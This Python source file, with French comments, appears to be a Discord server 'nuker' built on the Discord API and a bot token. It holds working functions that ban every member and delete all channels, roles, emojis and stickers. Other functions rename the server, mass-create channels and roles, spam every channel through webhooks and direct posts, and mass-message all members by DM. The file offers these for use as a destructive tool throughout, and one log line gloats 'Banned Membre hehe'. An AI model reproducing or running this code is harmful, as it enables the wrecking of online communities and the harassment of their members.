import asyncio
import aiohttp
from datetime import datetime
from colorama import Fore

class APIFunctions:
    """Gestion des appels API Discord"""
    
    def __init__(self, token, guild_id):
        self.token = token
        self.guild_id = guild_id
        self.headers = {"Authorization": f"Bot {token}"}
    
    # ============================================
    # FONCTIONS DE SUPPRESSION
    # ============================================
    
    async def ban_members(self, session, member_id):
        """Bannir un membre spécifique"""
        while True:
            try:
                async with session.put(f"https://discord.com/api/v9/guilds/{self.guild_id}/bans/{member_id}", headers=self.headers) as r:
                    if r.status == 429:
                        retry_after = (await r.json()).get('retry_after', 1)
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRate limit! Attente {retry_after}s")
                        await asyncio.sleep(retry_after)
                    else:
                        if r.status in [200, 201, 204]:
                            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mBanned Membre hehe {member_id}")
                            break
                        else:
                            break
            except Exception as e:
                print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mErreur de ban: {member_id} - {e}")
                break

    async def delete_channels(self, session, channel_id):
        """Supprimer un channel spécifique"""
        while True:
            try:
                async with session.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers=self.headers) as r:
                    if r.status == 429:
                        retry_after = (await r.json()).get('retry_after', 1)
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRate limit! Attente {retry_after}s")
                        await asyncio.sleep(retry_after)
                    else:
                        if r.status in [200, 201, 204]:
                            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mChannel supprimé {channel_id}")
                            break
                        else:
                            break
            except Exception as e:
                print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mErreur pour supprimé ce channel {channel_id} - {e}")
                break

    async def delete_roles(self, session, role_id):
        """Supprimer un rôle spécifique"""
        while True:
            try:
                async with session.delete(f'https://discord.com/api/v9/guilds/{self.guild_id}/roles/{role_id}', headers=self.headers) as r:
                    if r.status == 429:
                        retry_after = (await r.json()).get('retry_after', 1)
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRate limit! Attente {retry_after}s")
                        await asyncio.sleep(retry_after)
                    else:
                        if r.status in [200, 201, 204]:
                            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mRole supprimé: {role_id}")
                            break
                        else:
                            break
            except Exception as e:
                print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mErreur lors de la suppression de ce role {role_id} - {e}")
                break

    # ============================================
    # FONCTIONS DE CRÉATION
    # ============================================

    async def create_channels(self, session, channel_name, type=0):
        """Créer un nouveau channel"""
        while True:
            try:
                async with session.post(f'https://discord.com/api/v9/guilds/{self.guild_id}/channels', headers=self.headers, json={'name': channel_name, 'type': type}) as r:
                    if r.status == 429:
                        retry_after = (await r.json()).get('retry_after', 1)
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRate limit! Attente {retry_after}s")
                        await asyncio.sleep(retry_after)
                    else:
                        if r.status in [200, 201, 204]:
                            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mChannel created for {self.guild_id} - {channel_name}")
                            break
                        else:
                            break
            except Exception as e:
                print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mFailed to create channel for {self.guild_id}: {e}")
                break

    async def create_roles(self, session, role_name):
        """Créer un nouveau rôle"""
        while True:
            try:
                async with session.post(f'https://discord.com/api/v9/guilds/{self.guild_id}/roles', headers=self.headers, json={'name': role_name}) as r:
                    if r.status == 429:
                        retry_after = (await r.json()).get('retry_after', 1)
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mRate limit! Attente {retry_after}s")
                        await asyncio.sleep(retry_after)
                    else:
                        if r.status in [200, 201, 204]:
                            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mRôle crée pour {self.guild_id} - {role_name}")
                            break
                        else:
                            break
            except Exception as e:
                print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mÉchec de la création du rôle pour {self.guild_id}: {e}")
                break

    async def delete_emoji(self, session, emoji_id):
        """Supprimer un emoji spécifique"""
        while True:
            try:
                async with session.delete(f'https://discord.com/api/v9/guilds/{self.guild_id}/emojis/{emoji_id}', headers=self.headers) as r:
                    if r.status == 429:
                        retry_after = (await r.json()).get('retry_after', 1)
                        await asyncio.sleep(retry_after)
                    else:
                        if r.status in [200, 201, 204]:
                            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mEmoji supprimé: {emoji_id}")
                            break
                        else:
                            break
            except:
                break

    async def delete_sticker(self, session, sticker_id):
        """Supprimer un sticker spécifique"""
        while True:
            try:
                async with session.delete(f'https://discord.com/api/v9/guilds/{self.guild_id}/stickers/{sticker_id}', headers=self.headers) as r:
                    if r.status == 429:
                        retry_after = (await r.json()).get('retry_after', 1)
                        await asyncio.sleep(retry_after)
                    else:
                        if r.status in [200, 201, 204]:
                            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mSticker supprimé: {sticker_id}")
                            break
                        else:
                            break
            except:
                break

    async def edit_guild(self, name=None):
        """Modifier le nom du serveur"""
        try:
            async with aiohttp.ClientSession() as session:
                payload = {}
                if name: payload['name'] = name
                async with session.patch(f"https://discord.com/api/v9/guilds/{self.guild_id}", headers=self.headers, json=payload) as r:
                    if r.status in [200, 201, 204]:
                        print(f"\033[92m✓ Serveur renommé en: {name}\033[0m")
                    else:
                        print(f"\033[91m✗ Échec renommage: {r.status}\033[0m")
        except Exception as e:
            print(f"\033[91mErreur edit_guild: {e}\033[0m")

    async def rename_bot(self, username=None):
        """Renommer le bot utilisateur"""
        if not username:
            print("\033[91mErreur rename_bot: aucun nom fourni\033[0m")
            return
        try:
            async with aiohttp.ClientSession() as session:
                payload = {'username': username}
                async with session.patch('https://discord.com/api/v9/users/@me', headers=self.headers, json=payload) as r:
                    if r.status in [200, 201, 204]:
                        print(f"\033[92m✓ Bot renommé en: {username}\033[0m")
                    else:
                        error_text = await r.text()
                        print(f"\033[91m✗ Échec renommage du bot: {r.status} - {error_text}\033[0m")
        except Exception as e:
            print(f"\033[91mErreur rename_bot: {e}\033[0m")

    # ============================================
    # FONCTIONS WEBHOOK
    # ============================================

    async def spam_webhooks(self, session, channel_id, web_name, msg_amt, msg):
        """Créer un webhook et spammer des messages"""
        try:
            async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/webhooks', headers=self.headers, json={'name': web_name}) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mLimite de débit, veuillez réessayer plus tard...")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mWebhook crée pour ce channel {channel_id}")
                        webhook_raw = await r.json()
                        webhook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
                        await self.send_message(webhook, msg, msg_amt)
        except Exception as e:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mWebhook erreur {channel_id}: {e}")

    async def send_message(self, hook, message, amount):
        """Envoyer des messages via webhook"""
        async with aiohttp.ClientSession() as session:
            for i in range(amount):
                try:
                    async with session.post(hook, json={'content': message, 'tts': False}) as r:
                        if r.status == 429:
                            retry_after = (await r.json()).get('retry_after', 2)
                            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142mLimite de débit, attentez {retry_after}s...")
                            await asyncio.sleep(retry_after)
                        elif r.status in [200, 204]:
                            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mMessage {i+1}/{amount} envoyé avec succès.")
                        else:
                            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mErreur: {r.status}")
                except Exception as e:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mErreur: {e}")
                await asyncio.sleep(0.6)

    # ============================================
    # FONCTIONS DE RÉCUPÉRATION
    # ============================================

    async def get_roles(self):
        """Récupérer tous les IDs des rôles"""
        roleIDS = []
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://discord.com/api/v9/guilds/{self.guild_id}/roles", headers=self.headers) as r:
                    m = await r.json()
                    for role in m:
                        roleIDS.append(role["id"])
        except Exception as e:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196mError de le recuperation des rôles: {e}")
        return roleIDS

    async def get_channels(self):
        """Récupérer tous les IDs des channels"""
        channelIDS = []
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://discord.com/api/v9/guilds/{self.guild_id}/channels", headers=self.headers) as r:
                    if r.status == 200:
                        m = await r.json()
                        print(f"\033[92mDEBUG: {len(m)} channels trouvés dans le total\033[0m")
                        for channel in m:
                            channel_type = channel.get("type")
                            if channel_type in [0, 5, 10, 11, 12, 15]:
                                channelIDS.append(channel["id"])
                                print(f"\033[96m  ✓ {channel.get('name', 'unknown')} (Type: {channel_type}, ID: {channel['id']})\033[0m")
                            else:
                                print(f"\033[90m  ✗ Ignorée (type {channel_type}): {channel.get('name', 'unknown')}\033[0m")
                    else:
                        error = await r.text()
                        print(f"\033[91mAPI erreur pour avoir les channels: {r.status} - {error}\033[0m")
        except Exception as e:
            print(f"\033[91mException get_channels: {e}\033[0m")
            import traceback
            traceback.print_exc()
        print(f"\033[92m✓ TOTAUX DES CHANNELS A SPAM: {len(channelIDS)}\033[0m")
        return channelIDS

    async def get_members(self):
        """Récupérer tous les IDs des membres (avec pagination)"""
        memberIDS = []
        last_id = 0
        while True:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(f"https://discord.com/api/v9/guilds/{self.guild_id}/members?limit=1000&after={last_id}", headers=self.headers) as r:
                        if r.status == 200:
                            m = await r.json()
                            if not m:
                                break
                            for member in m:
                                memberIDS.append(member["user"]["id"])
                                last_id = member["user"]["id"]
                            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34mRécupéré {len(memberIDS)} membres...")
                        elif r.status == 429:
                            retry_after = (await r.json()).get('retry_after', 1)
                            await asyncio.sleep(retry_after)
                        else:
                            break
            except Exception as e:
                print(f"\x1b[38;5;196mErreur récupération membres: {e}")
                break
        return memberIDS

    async def get_full_members_list(self):
        """Récupérer la liste complète des membres avec détails"""
        members = []
        last_id = 0
        while True:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(f"https://discord.com/api/v9/guilds/{self.guild_id}/members?limit=1000&after={last_id}", headers=self.headers) as r:
                        if r.status == 200:
                            m = await r.json()
                            if not m: break
                            for member in m:
                                user = member["user"]
                                members.append({
                                    "id": user["id"],
                                    "username": f"{user['username']}#{user.get('discriminator', '0')}",
                                    "display_name": member.get("nick") or user["username"],
                                    "avatar": user.get("avatar"),
                                    "bot": user.get("bot", False)
                                })
                                last_id = user["id"]
                        elif r.status == 429:
                            await asyncio.sleep((await r.json()).get('retry_after', 1))
                        else: break
            except: break
        return members

    async def get_full_roles_list(self):
        """Récupérer la liste complète des rôles avec détails"""
        roles = []
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://discord.com/api/v9/guilds/{self.guild_id}/roles", headers=self.headers) as r:
                    if r.status == 200:
                        m = await r.json()
                        for role in m:
                            roles.append({
                                "id": role["id"],
                                "name": role["name"],
                                "color": hex(role["color"])[2:].zfill(6),
                                "position": role["position"],
                                "managed": role.get("managed", False)
                            })
        except: pass
        return sorted(roles, key=lambda x: x["position"], reverse=True)

    async def get_server_stats(self):
        """Récupérer les statistiques globales du serveur"""
        stats = {"channels": 0, "roles": 0, "members": 0, "emojis": 0, "stickers": 0, "name": "Unknown"}
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://discord.com/api/v9/guilds/{self.guild_id}", headers=self.headers) as r:
                    if r.status == 200:
                        data = await r.json()
                        stats["name"] = data.get("name")
                        stats["emojis"] = len(data.get("emojis", []))
                        stats["stickers"] = len(data.get("stickers", []))
                        stats["roles"] = len(data.get("roles", []))
                
                async with session.get(f"https://discord.com/api/v9/guilds/{self.guild_id}/channels", headers=self.headers) as r:
                    if r.status == 200:
                        stats["channels"] = len(await r.json())
                
                # Membres est plus complexe car nécessite l'intention ou pagination
                members = await self.get_members()
                stats["members"] = len(members)
        except: pass
        return stats

    async def get_emojis(self):
        """Récupérer tous les IDs des emojis"""
        emojiIDS = []
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://discord.com/api/v9/guilds/{self.guild_id}/emojis", headers=self.headers) as r:
                    m = await r.json()
                    for e in m:
                        emojiIDS.append(e["id"])
        except: pass
        return emojiIDS

    async def get_stickers(self):
        """Récupérer tous les IDs des stickers"""
        stickerIDS = []
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://discord.com/api/v9/guilds/{self.guild_id}/stickers", headers=self.headers) as r:
                    m = await r.json()
                    for s in m:
                        stickerIDS.append(s["id"])
        except: pass
        return stickerIDS

    # ============================================
    # FONCTIONS BATCH (Actions multiples)
    # ============================================

    async def delete_all_emojis(self):
        """Supprimer tous les emojis"""
        emojis = await self.get_emojis()
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[self.delete_emoji(session, eid) for eid in emojis])

    async def delete_all_stickers(self):
        """Supprimer tous les stickers"""
        stickers = await self.get_stickers()
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[self.delete_sticker(session, sid) for sid in stickers])

    async def delete_all_channels(self, channels):
        """Supprimer tous les channels"""
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[self.delete_channels(session, channel_id) for channel_id in channels])

    async def delete_all_roles(self, roles):
        """Supprimer tous les rôles"""
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[self.delete_roles(session, role_id) for role_id in roles])

    async def ban_all_members(self, members):
        """Bannir tous les membres"""
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[self.ban_members(session, member_id) for member_id in members])

    async def create_multiple_channels(self, chan_name, amount):
        """Créer plusieurs channels"""
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[self.create_channels(session, chan_name, 0) for i in range(amount)])

    async def create_multiple_roles(self, role_name, amount):
        """Créer plusieurs rôles"""
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[self.create_roles(session, role_name) for i in range(amount)])

    async def spam_all_webhooks(self, web_name, web_msg, msg_amt):
        """Spam tous les channels avec des webhooks"""
        channels = await self.get_channels()
        print(Fore.LIGHTYELLOW_EX + f"Spam dans {len(channels)} channels avec {msg_amt} messages recu")

        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[
                self.spam_webhooks(session, channel_id, web_name, msg_amt, web_msg)
                for channel_id in channels
            ])

        print(Fore.LIGHTGREEN_EX + f"✓ Spam completé dans tous les channels !")

    async def spam_all_channels_direct(self, message, amount):
        """Spam tous les channels directement avec le bot token"""
        channels = await self.get_channels()
        print(Fore.LIGHTYELLOW_EX + f"Direct Spam dans {len(channels)} channels...")

        async with aiohttp.ClientSession() as session:
            async def spam_one(channel_id):
                tasks = []
                for _ in range(amount):
                    async def send():
                        try:
                            async with session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", 
                                                   headers=self.headers, 
                                                   json={'content': message}) as r:
                                if r.status == 429:
                                    retry_after = (await r.json()).get('retry_after', 1)
                                    await asyncio.sleep(retry_after)
                                    await send()
                        except: pass
                    tasks.append(send())
                await asyncio.gather(*tasks)

            await asyncio.gather(*[spam_one(cid) for cid in channels])
        print(Fore.LIGHTGREEN_EX + f"✓ Direct Spam completé !")

    async def dm_member(self, session, user_id, message):
        """Envoyer un DM à un membre"""
        try:
            # Créer un DM
            async with session.post("https://discord.com/api/v9/users/@me/channels", headers=self.headers, json={"recipient_id": user_id}) as r:
                if r.status == 200:
                    dm_channel = await r.json()
                    channel_id = dm_channel["id"]
                    # Envoyer le message
                    async with session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=self.headers, json={"content": message}) as r2:
                        if r2.status == 200:
                            print(f"\x1b[38;5;34mDM envoyé à {user_id}")
                            return True
                        elif r2.status == 429:
                            retry_after = (await r2.json()).get('retry_after', 1)
                            await asyncio.sleep(retry_after)
                            return await self.dm_member(session, user_id, message)
                elif r.status == 429:
                    retry_after = (await r.json()).get('retry_after', 1)
                    await asyncio.sleep(retry_after)
                    return await self.dm_member(session, user_id, message)
        except: pass
        return False

    async def dm_all_members_action(self, message):
        """Envoyer un DM à tous les membres"""
        members = await self.get_members()
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[self.dm_member(session, mid, message) for mid in members])
        print(Fore.LIGHTGREEN_EX + f"✓ DM All completé !")
